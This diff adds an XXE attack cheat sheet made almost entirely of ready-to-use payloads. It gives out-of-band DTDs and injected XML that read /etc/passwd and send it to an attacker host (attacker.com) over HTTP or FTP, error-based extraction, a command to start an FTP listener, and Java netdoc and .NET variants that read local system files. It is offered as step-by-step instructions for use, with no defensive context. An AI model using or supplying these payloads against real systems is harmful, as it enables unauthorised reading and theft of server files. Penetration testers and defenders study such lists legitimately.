@@ -1,0 +1,52 @@
+# Out-of-Band XXE (when no direct output)
+
+# Step 1: Host this DTD on your server (evil.dtd)
+# ================================================
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
+# %eval;
+# %exfil;
+
+# Step 2: Inject this XML
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>
+
+# Alternative OOB via FTP
+# evil.dtd:
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
+# %eval;
+# %exfil;
+
+# Error-based XXE (extract data via error messages)
+# evil.dtd:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+# Multi-line file exfil via FTP
+# Start FTP server: python3 -m pyftpdlib -p 21
+# evil.dtd:
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
+%eval;
+%exfil;
+
+# Java specific - netdoc
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+# .NET specific - file read
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>&xxe;</root>
